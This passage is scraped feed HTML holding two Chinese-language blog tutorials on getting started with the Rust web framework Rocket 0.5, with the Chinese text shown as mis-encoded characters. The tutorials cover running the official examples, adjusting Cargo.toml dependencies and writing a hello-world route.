<p>å°±å¯ä»¥çœ‹åˆ°ä½ çš„ç¬¬ä¸€ä¸ª Rocket é¡µé¢äº†ã€‚</p>
<h3 data-id="heading-5">2.3 æ›´å¤šç¤ºä¾‹ï¼šä¸æ˜¯åªæœ‰ Hello World</h3>
<p><code>examples/</code> ä¸‹çš„æ¯ä¸€ä¸ªå­ç›®å½•åŸºæœ¬éƒ½æ˜¯ä¸€ä¸ªç‹¬ç«‹å° Demoï¼Œæ¯”å¦‚ï¼š</p>
<ul>
<li><code>examples/json</code>ï¼šæ¼”ç¤º JSON API</li>
<li><code>examples/forms</code>ï¼šæ¼”ç¤ºè¡¨å•å¤„ç†</li>
<li><code>examples/static_files</code>ï¼šæ¼”ç¤ºé™æ€æ–‡ä»¶æœåŠ¡</li>
<li><code>examples/chat</code>ï¼šæ¼”ç¤ºå®æ—¶èŠå¤©ï¼ˆç»“åˆå¼‚æ­¥æµï¼‰</li>
<li>â€¦â€¦</li>
</ul>
<p>è¿›å…¥ä»»æ„ä¸€ä¸ªç¤ºä¾‹ç›®å½•ï¼Œæ‰§è¡Œï¼š</p>
<pre><code class="hljs language-bash" lang="bash">cargo run
</code></pre>
<p>å°±èƒ½ä½“éªŒå¯¹åº”åŠŸèƒ½ï¼Œéå¸¸é€‚åˆä½œä¸ºâ€œå­¦ä¹ å…¥å£ + ä»£ç å‚è€ƒâ€ã€‚</p>
<h2 data-id="heading-6">ä¸‰ã€ä¸ºä»€ä¹ˆç¤ºä¾‹èƒ½ç›´æ¥è·‘ï¼ŸCargo.toml åšäº†ä»€ä¹ˆï¼Ÿ</h2>
<p><strong>ç¤ºä¾‹å·¥ç¨‹çš„ Cargo.toml å¹¶ä¸æ˜¯ä» crates.io ä¸‹è½½ Rocketï¼Œè€Œæ˜¯ç›´æ¥å¼•ç”¨ä½ åˆšåˆšå…‹éš†ä¸‹æ¥çš„æœ¬åœ° Rocket æºç ã€‚</strong></p>
<p>å…¸å‹å†™æ³•ä¼šç±»ä¼¼è¿™æ ·ï¼ˆç¤ºæ„ï¼‰ï¼š</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[dependencies]</span>
<span class="hljs-attr">rocket</span> = { path = <span class="hljs-string">"../../core/lib"</span>, features = [<span class="hljs-string">"json"</span>] }
</code></pre>
<p>è¿™æ ·åšæœ‰å‡ ä¸ªå¥½å¤„ï¼š</p>
<ul>
<li>å¯¹ Rocket ä½œè€…æ¥è¯´ï¼šæ”¹åŠ¨æ¡†æ¶æºç åï¼Œç›´æ¥åœ¨ examples é‡ŒéªŒè¯æ˜¯å¦ä¸€åˆ‡æ­£å¸¸</li>
<li>å¯¹ä½ æ¥è¯´ï¼šclone å®Œæ•´ä»“åº“åï¼Œæ— éœ€é…ç½®ä¾èµ–å°±èƒ½è·‘å…¨å¥—ç¤ºä¾‹</li>
<li>å¯¹è°ƒè¯•æ¥è¯´ï¼šå¯ä»¥é¡ºæ‰‹ç‚¹è¿› Rocket æºç é‡Œçœ‹å…·ä½“å®ç°</li>
</ul>
<p>ä½†æ˜¯ï¼Œå½“ä½ æŠŠè¿™äº›ç¤ºä¾‹ä»£ç <strong>å¤åˆ¶åˆ°è‡ªå·±é¡¹ç›®é‡Œç”¨</strong>æ—¶ï¼Œå°±è¦æ³¨æ„äº†ï¼š</p>
<blockquote>
<p><strong>ä½ ä¸åº”è¯¥ç»§ç»­ä½¿ç”¨ path ä¾èµ–ï¼Œè€Œæ˜¯åº”è¯¥æ”¹ä¸ºæ­£å¸¸çš„ç‰ˆæœ¬ä¾èµ–ã€‚</strong></p>
</blockquote>
<h2 data-id="heading-7">å››ã€åŸºäºç¤ºä¾‹åˆ›å»ºè‡ªå·±çš„ Rocket é¡¹ç›®</h2>
<p>é€šå¸¸æˆ‘ä»¬ä¼šè¿™æ ·æ“ä½œï¼š</p>
<ol>
<li>å…ˆåœ¨ <code>examples</code> ä¸‹æ‰¾åˆ°ä¸€ä¸ªåŠŸèƒ½æ¥è¿‘éœ€æ±‚çš„ç¤ºä¾‹</li>
<li>ç¡®è®¤å®ƒèƒ½æ­£å¸¸è·‘</li>
<li>ç„¶åæ–°å»ºä¸€ä¸ªè‡ªå·±çš„é¡¹ç›®ï¼ŒæŠŠç¤ºä¾‹çš„æ ¸å¿ƒä»£ç å¤åˆ¶è¿‡å»ï¼Œå†è°ƒæ•´ä¾èµ–å’Œç»“æ„</li>
</ol>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªæ¯”è¾ƒæ¨èçš„æµç¨‹ã€‚</p>
<h3 data-id="heading-8">4.1 æ–°å»ºä¸€ä¸ªè‡ªå·±çš„é¡¹ç›®</h3>
<p>æ¯”å¦‚æˆ‘ä»¬æƒ³åˆ›å»ºä¸€ä¸ªå« <code>my-rocket-app</code> çš„é¡¹ç›®ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">cargo new my-rocket-app --bin
<span class="hljs-built_in">cd</span> my-rocket-app
</code></pre>
<p>ç»“æ„å¤§æ¦‚æ˜¯ï¼š</p>
<pre><code class="hljs language-text" lang="text">my-rocket-app
â”œâ”€â”€ Cargo.toml
â””â”€â”€ src
    â””â”€â”€ main.rs
</code></pre>
<h3 data-id="heading-9">4.2 ä¿®æ”¹ Cargo.tomlï¼šä»æœ¬åœ° path æ”¹ä¸ºç‰ˆæœ¬ä¾èµ–</h3>
<p>ç¤ºä¾‹å·¥ç¨‹ç”¨çš„æ˜¯æœ¬åœ° path ä¾èµ–ï¼Œè€Œä½ è‡ªå·±çš„é¡¹ç›®åº”è¯¥åƒæ™®é€š Rust é¡¹ç›®é‚£æ ·å†™ï¼š</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[package]</span>
<span class="hljs-attr">name</span> = <span class="hljs-string">"my-rocket-app"</span>
<span class="hljs-attr">version</span> = <span class="hljs-string">"0.1.0"</span>
<span class="hljs-attr">edition</span> = <span class="hljs-string">"2021"</span>

<span class="hljs-section">[dependencies]</span>
<span class="hljs-attr">rocket</span> = { version = <span class="hljs-string">"0.5.1"</span>, features = [<span class="hljs-string">"json"</span>, <span class="hljs-string">"secrets"</span>] }
<span class="hljs-comment"># éœ€è¦æ¨¡æ¿çš„è¯ï¼š</span>
<span class="hljs-comment"># rocket_dyn_templates = { version = "0.2.0", features = ["tera"] }</span>
</code></pre>
<p>è¿™é‡Œæ³¨æ„ä¸¤ç‚¹ï¼š</p>
<ol>
<li>
<p><code>rocket</code> ç›´æ¥æŒ‡å®š <code>0.5.x</code> ç‰ˆæœ¬ï¼Œè€Œä¸æ˜¯ <code>path = ...</code></p>
</li>
<li>
<p><code>features</code> æ ¹æ®ä½ çš„å®é™…éœ€æ±‚å¯ç”¨ï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li><code>json</code>ï¼šå¯ç”¨ JSON æ”¯æŒ</li>
<li><code>secrets</code>ï¼šå¯ç”¨ç§æœ‰ Cookieï¼ˆ0.5 ä¸­é»˜è®¤æ˜¯ off-by-defaultï¼‰</li>
</ul>
</li>
</ol>
<h3 data-id="heading-10">4.3 å¤åˆ¶ç¤ºä¾‹ä»£ç ï¼Œè°ƒæ•´æˆè‡ªå·±çš„ main.rs</h3>
<p>é€‰ä¸€ä¸ªä½ å–œæ¬¢çš„ç¤ºä¾‹ï¼ˆä¾‹å¦‚ <code>examples/hello</code>ï¼‰ï¼Œæ‰“å¼€ <code>src/main.rs</code>ï¼Œä½ ä¼šçœ‹åˆ°ç±»ä¼¼ä»£ç ï¼ˆç®€åŒ–ç‰ˆï¼‰ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-meta">#[macro_use]</span> <span class="hljs-keyword">extern</span> <span class="hljs-keyword">crate</span> rocket;

<span class="hljs-meta">#[get(<span class="hljs-string">"/"</span>)]</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">index</span>() <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-symbol">'static</span> <span class="hljs-type">str</span> {
    <span class="hljs-string">"Hello, world!"</span>
}

<span class="hljs-meta">#[launch]</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">rocket</span>() <span class="hljs-punctuation">-&gt;</span> _ {
    rocket::<span class="hljs-title function_ invoke__">build</span>()
        .<span class="hljs-title function_ invoke__">mount</span>(<span class="hljs-string">"/"</span>, routes![index])
}
</code></pre>
<p>å¯ä»¥ç›´æ¥å¤åˆ¶åˆ°ä½ è‡ªå·±é¡¹ç›®çš„ <code>src/main.rs</code>ï¼Œç„¶åæ”¹ä¸€æ”¹è¿”å›å†…å®¹ã€è·¯ç”±è·¯å¾„ç­‰ç­‰ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-meta">#[macro_use]</span> <span class="hljs-keyword">extern</span> <span class="hljs-keyword">crate</span> rocket;

<span class="hljs-meta">#[get(<span class="hljs-string">"/"</span>)]</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">index</span>() <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-symbol">'static</span> <span class="hljs-type">str</span> {
    <span class="hljs-string">"Hello, my own Rocket app!"</span>
}

<span class="hljs-meta">#[launch]</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">rocket</span>() <span class="hljs-punctuation">-&gt;</span> _ {
    rocket::<span class="hljs-title function_ invoke__">build</span>()
        .<span class="hljs-title function_ invoke__">mount</span>(<span class="hljs-string">"/"</span>, routes![index])
}
</code></pre>
<p>ç„¶ååœ¨ä½ è‡ªå·±çš„é¡¹ç›®ç›®å½•ä¸‹è¿è¡Œï¼š</p>
<pre><code class="hljs language-bash" lang="bash">cargo run
</code></pre>
<p>å¦‚æœå¯ä»¥æ­£å¸¸å¯åŠ¨å¹¶è®¿é—®ï¼Œå°±è¯´æ˜ä½ å·²ç»åŸºäºç¤ºä¾‹å·¥ç¨‹ï¼Œæ­å¥½äº†å±äºè‡ªå·±çš„ Rocket 0.5 é¡¹ç›®éª¨æ¶ã€‚</p>
<h2 data-id="heading-11">äº”ã€Quickstart èƒŒåçš„æ€è·¯ï¼šå…ˆâ€œè·‘èµ·æ¥â€ï¼Œå†â€œææ˜ç™½â€</h2>
<p>Quickstart æ¨èçš„è·¯çº¿éå¸¸ç¬¦åˆä¸€ä¸ªç®€å•åŸåˆ™ï¼š</p>
<blockquote>
<p><strong>å…ˆè·‘èµ·æ¥ï¼Œå†ææ˜ç™½ã€‚</strong></p>
</blockquote>
<p>å…·ä½“æ¥è¯´ï¼Œå®ƒå¸®ä½ è§£å†³äº†ä¸‰ä¸ªå¸¸è§é˜»ç¢ï¼š</p>
<ol>
<li><strong>ç¯å¢ƒææƒ§ç—‡</strong>ï¼šä¸çŸ¥é“ Rust æ€ä¹ˆè£…ï¼Ÿâ†’ rustup ä¸€æ¡å‘½ä»¤æå®š</li>
<li><strong>æ¡†æ¶ä¸Šæ‰‹ææƒ§ç—‡</strong>ï¼šä¸çŸ¥é“ Rocket å…¥å£åœ¨å“ªï¼Ÿâ†’ ç›´æ¥è·‘ examples</li>
<li><strong>å·¥ç¨‹æ­å»ºææƒ§ç—‡</strong>ï¼šä¸çŸ¥é“ Cargo.toml æ€ä¹ˆå†™ï¼Ÿâ†’ å…ˆçœ‹ç¤ºä¾‹ï¼Œå†å¤åˆ¶åˆ°è‡ªå·±é¡¹ç›®é‡Œæ”¹</li>
</ol>
<p>å¯¹åˆšä¸Šæ‰‹ Rocket çš„åŒå­¦ï¼Œæ¯”è¾ƒæ¨èè¿™æ ·ä¸€æ¡å­¦ä¹ è·¯å¾„ï¼š</p>
<ol>
<li>è·‘ <code>examples/hello</code> â†’ ç¡®è®¤ç¯å¢ƒæ— é—®é¢˜</li>
<li>è·‘ <code>examples/json</code> / <code>examples/forms</code> â†’ ç†Ÿæ‚‰åŸºæœ¬åŠŸèƒ½</li>
<li>æ–°å»ºè‡ªå·±çš„é¡¹ç›®ï¼ŒæŠŠç¤ºä¾‹ä»£ç è¿ç§»è¿‡å» â†’ å½¢æˆè‡ªå·±çš„èµ·æ­¥å·¥ç¨‹</li>
<li>ä¹‹åå†å»çœ‹æ–‡æ¡£ä¸­æ›´å®Œæ•´çš„ç« èŠ‚ï¼šè·¯ç”±ã€è¯·æ±‚å®ˆå«ã€å“åº”å™¨ã€é…ç½®ã€æ•°æ®åº“ã€æ¨¡æ¿ç­‰</li>
</ol>
<h2 data-id="heading-12">å…­ã€ç»“è¯­</h2>
<p>Rocket çš„ Quickstart ç»™å‡ºçš„å…¶å®ä¸æ˜¯â€œç†è®ºæ•™å­¦â€ï¼Œè€Œæ˜¯ä¸€æ¡<strong>éå¸¸åŠ¡å®çš„å®è·µè·¯å¾„</strong>ï¼š</p>
<ul>
<li>ç”¨æœ€å°‘çš„æ­¥éª¤ï¼Œå¿«é€Ÿä½“éªŒåˆ°æ¡†æ¶çš„çœŸå®å¼€å‘æ„Ÿå—ï¼›</li>
<li>å†å€ŸåŠ© examples ä½œä¸ºâ€œå¯è¿è¡Œçš„æ–‡æ¡£â€ï¼Œä¸€ç‚¹ç‚¹æŠŠæ€æƒ³ææ˜ç™½ã€‚</li>
</ul>
<p>å¦‚æœä½ å·²ç»å®Œæˆäº†ï¼š</p>
<ul>
<li>Rust ç¯å¢ƒå®‰è£…</li>
<li>Rocket ä»“åº“å…‹éš†</li>
<li><code>examples/hello</code> èƒ½æ­£å¸¸è·‘</li>
<li>åŸºäºç¤ºä¾‹åˆ›å»ºäº†è‡ªå·±çš„ <code>my-rocket-app</code></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Rocket 0.5 å¿«é€Ÿä¸Šæ‰‹3 åˆ†é’Ÿè·‘èµ·ç¬¬ä¸€ä¸ª Rust Web æœåŠ¡]]></title>    <link>https://juejin.cn/post/7581888578507980827</link>    <guid>https://juejin.cn/post/7581888578507980827</guid>    <pubDate>2025-12-10T02:41:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581888578507980827" data-draft-id="7581727073581989939" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Rocket 0.5 å¿«é€Ÿä¸Šæ‰‹3 åˆ†é’Ÿè·‘èµ·ç¬¬ä¸€ä¸ª Rust Web æœåŠ¡"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-10T02:41:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="HelloReader"/> <meta itemprop="url" content="https://juejin.cn/user/2601910535729322"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Rocket 0.5 å¿«é€Ÿä¸Šæ‰‹3 åˆ†é’Ÿè·‘èµ·ç¬¬ä¸€ä¸ª Rust Web æœåŠ¡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2601910535729322/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    HelloReader
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:41:17.000Z" title="Wed Dec 10 2025 02:41:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€å‰ç½®æ¡ä»¶ï¼šå…ˆæŠŠ Rust ç¯å¢ƒè£…å¥½</h2>
<p>Rocket æ˜¯ä¸€ä¸ª Rust Web æ¡†æ¶ï¼Œæ‰€ä»¥ç¬¬ä¸€æ­¥å½“ç„¶æ˜¯ï¼š<strong>å®‰è£… Rust å·¥å…·é“¾</strong>ã€‚</p>
<p>å®˜æ–¹æ¨èä½¿ç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Frustup.rs%2F" target="_blank" title="https://rustup.rs/" ref="nofollow noopener noreferrer"><code>rustup</code></a> ç®¡ç† Rust ç‰ˆæœ¬ï¼Œå®ƒçš„ä¼˜åŠ¿æ˜¯ï¼š</p>
<ul>
<li>æ”¯æŒ stable / beta / nightly å¤šé€šé“åˆ‡æ¢</li>
<li>å¯ä»¥æŒ‰é¡¹ç›®ç›®å½•è¦†ç›–ç‰ˆæœ¬ï¼ˆå¯¹ Rocket å¾ˆå®ç”¨ï¼‰</li>
<li>å‡çº§ã€å¸è½½éƒ½å¾ˆç®€å•</li>
</ul>
<p>å¦‚æœä½ è¿˜æ²¡è£… Rustï¼Œå¯ä»¥ç®€å•ç†è§£æµç¨‹ï¼š</p>
<ol>
<li>
<p>æ‰“å¼€ rustup å®˜ç½‘ï¼ŒæŒ‰æç¤ºæ‰§è¡Œå®‰è£…å‘½ä»¤ï¼›</p>
</li>
<li>
<p>å®‰è£…å®Œæˆåï¼Œåœ¨ç»ˆç«¯é‡Œæ‰§è¡Œï¼š</p>
<pre><code class="hljs language-bash" lang="bash">rustc --version
cargo --version
</code></pre>
<p>å¦‚æœä¸¤ä¸ªå‘½ä»¤éƒ½èƒ½æ­£å¸¸è¾“å‡ºç‰ˆæœ¬å·ï¼Œè¯´æ˜ç¯å¢ƒ OKã€‚</p>
</li>
</ol>
<blockquote>
<p>å¦‚æœä½ å®Œå…¨æ²¡æ¥è§¦è¿‡ Rustï¼Œå»ºè®®å…ˆç¨å¾®çœ‹å‡ çœ¼ã€ŠThe Rust Programming Languageã€‹ï¼ˆä¿—ç§° Rust Bookï¼‰ï¼Œå†ç”¨ Rocket ä¼šæ›´é¡ºç•…ã€‚</p>
</blockquote>
<h2 data-id="heading-1">äºŒã€æœ€å¿«ä½“éªŒ Rocketï¼šç›´æ¥è·‘å®˜æ–¹ä¾‹å­</h2>
<p>Rocket æä¾›äº†ä¸€å¥—éå¸¸å®Œå–„çš„ <strong>examples ç¤ºä¾‹å·¥ç¨‹</strong>ï¼Œå‡ ä¹è¦†ç›–äº†å¸¸è§åœºæ™¯ï¼š
æ¯”å¦‚ Hello Worldã€JSON APIã€æ–‡ä»¶æœåŠ¡ã€è¡¨å•ã€WebSocket ç­‰ã€‚</p>
<p>æœ€ç®€å•çš„ä¸Šæ‰‹æ–¹å¼æ˜¯ï¼š<strong>æŠŠæ•´ä¸ª Rocket ä»“åº“æ‹‰ä¸‹æ¥ï¼Œç„¶åè¿› examples è·‘ demo</strong>ã€‚</p>
<h3 data-id="heading-2">2.1 å…‹éš† Rocket ä»“åº“</h3>
<p>åœ¨ç»ˆç«¯æ‰§è¡Œï¼š</p>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> https://github.com/rwf2/Rocket
<span class="hljs-built_in">cd</span> Rocket
</code></pre>
<p>æ¥ç€åˆ‡åˆ° 0.5 ç‰ˆæœ¬çš„ tagï¼ˆä¿è¯æ–‡æ¡£ä¸ä»£ç ä¸€è‡´ï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">git checkout v0.5
</code></pre>
<blockquote>
<p>ä¸ºä»€ä¹ˆå»ºè®®åˆ‡åˆ° v0.5 ï¼Ÿ
å› ä¸ºä½ ç°åœ¨çœ‹çš„æ–‡æ¡£ã€å‡çº§æŒ‡å—éƒ½æ˜¯åŸºäº 0.5 çš„ï¼Œå¦‚æœç›´æ¥åœ¨ <code>master</code> ä¸Šï¼Œå¯èƒ½ä¼šé‡åˆ°è¿˜æ²¡ç¨³å®šçš„æ–°æ”¹åŠ¨ï¼Œå’Œæ–‡æ¡£ä¸åŒ¹é…ã€‚</p>
</blockquote>
<h3 data-id="heading-3">2.2 è¿è¡Œ hello ç¤ºä¾‹</h3>
<p>Rocket çš„ç¤ºä¾‹éƒ½æ”¾åœ¨ <code>examples/</code> ç›®å½•ä¸‹ï¼Œå…ˆä»æœ€ç»å…¸çš„ <code>hello</code> å¼€å§‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> examples/hello
cargo run
</code></pre>
<p>å¦‚æœä¸€åˆ‡é¡ºåˆ©ï¼Œä½ ä¼šçœ‹åˆ°ç±»ä¼¼è¾“å‡ºï¼ˆçœç•¥éƒ¨åˆ†ï¼‰ï¼š</p>
<pre><code class="hljs language-text" lang="text">ğŸš€ Rocket has launched from http://127.0.0.1:8000
</code></pre>
<p>è¿™æ—¶å€™æµè§ˆå™¨æ‰“å¼€ <code>http://127.0.0.1:8000</code>ï¼Œå°±èƒ½çœ‹åˆ°ç¬¬ä¸€ä¸ª Rocket Web æœåŠ¡çš„å“åº”äº†ã€‚</p>
<blockquote>
<p><strong>å°æŠ€å·§ï¼š</strong>
æ‰€æœ‰ examples ç›®å½•ä¸‹çš„ç¤ºä¾‹ï¼Œéƒ½å¯ä»¥é€šè¿‡ <code>cargo run</code> å¯åŠ¨ï¼š</p>
<ul>
<li><code>examples/json</code></li>
<li><code>examples/forms</code></li>
<li><code>examples/chat</code>ï¼ˆå®æ—¶èŠå¤©ï¼‰</li>
<li><code>examples/websocket</code>ï¼ˆå¦‚æœæœ‰çš„è¯ï¼Œå–å†³äºä½ å½“å‰ tagï¼‰
å¯ä»¥æŒ‰éœ€ä¸€ä¸ªä¸ªç©è¿‡å»ï¼Œæ„Ÿå—ä¸€ä¸‹ Rocket 0.5 çš„èƒ½åŠ›è¾¹ç•Œã€‚</li>
</ul>
</blockquote>
<h3 data-id="heading-4">2.3 ä¸ºä»€ä¹ˆå®˜æ–¹æ¨èâ€œå…ˆè·‘ examplesâ€</h3>
<p>åŸå› å¾ˆç®€å•ï¼š<strong>é—¨æ§›æœ€ä½ã€åé¦ˆæœ€å¿«</strong>ï¼š</p>
<ul>
<li>ä¸ç”¨è‡ªå·±å†™ <code>Cargo.toml</code>ã€ä¸éœ€è¦çº ç»“ä¾èµ–ç‰ˆæœ¬ï¼›</li>
<li>ä¸éœ€è¦ä¸€å¼€å§‹å°±ç†è§£ Rocket çš„æ‰€æœ‰æ¦‚å¿µï¼›</li>
<li>å…ˆè·‘èµ·æ¥ï¼Œå†é€æ­¥ä» â€œèƒ½è·‘â€ â†’ â€œèƒ½æ”¹â€ â†’ â€œèƒ½å†™è‡ªå·±çš„â€ã€‚</li>
</ul>
<p>è€Œä¸” examples é‡Œçš„ <code>Cargo.toml</code> å·²ç»å¸®ä½ é…ç½®å¥½äº†ï¼š</p>
<ul>
<li>ä¾èµ–æŒ‡å‘æœ¬åœ° <code>rocket</code> æºç ï¼ˆpath dependencyï¼‰ï¼›</li>
<li>å·²ç»åŒ…å«äº†å¯¹åº”ç¤ºä¾‹éœ€è¦çš„ featureï¼ˆæ¯”å¦‚ jsonã€templates ç­‰ï¼‰ã€‚</li>
</ul>
<p>æ¥ä¸‹æ¥è¦åšçš„ï¼Œå°±æ˜¯<strong>æŠŠè¿™äº›ç¤ºä¾‹å˜æˆä½ è‡ªå·±çš„é¡¹ç›®</strong>ã€‚</p>
<h2 data-id="heading-5">ä¸‰ã€ä»å®˜æ–¹ç¤ºä¾‹â€œå¤åˆ¶â€å‡ºè‡ªå·±çš„ Rocket é¡¹ç›®</h2>
<p>å½“ä½ å¯¹æŸä¸ªç¤ºä¾‹æ¯”è¾ƒæ»¡æ„æ—¶ï¼Œé€šå¸¸æœ‰ä¸¤ç§åšæ³•ï¼š</p>
<ol>
<li>åœ¨ Rocket ä»“åº“é‡Œç›´æ¥æ”¹ï¼ˆä¸æ¨èï¼Œéš¾ä»¥ä¸å®˜æ–¹æ›´æ–°è§£è€¦ï¼‰</li>
<li>æŠŠç¤ºä¾‹ä»£ç  copy åˆ°ä½ è‡ªå·±çš„é¡¹ç›®ç›®å½•ï¼Œç„¶åè°ƒæ•´ <code>Cargo.toml</code>ï¼ˆæ¨èï¼‰</li>
</ol>
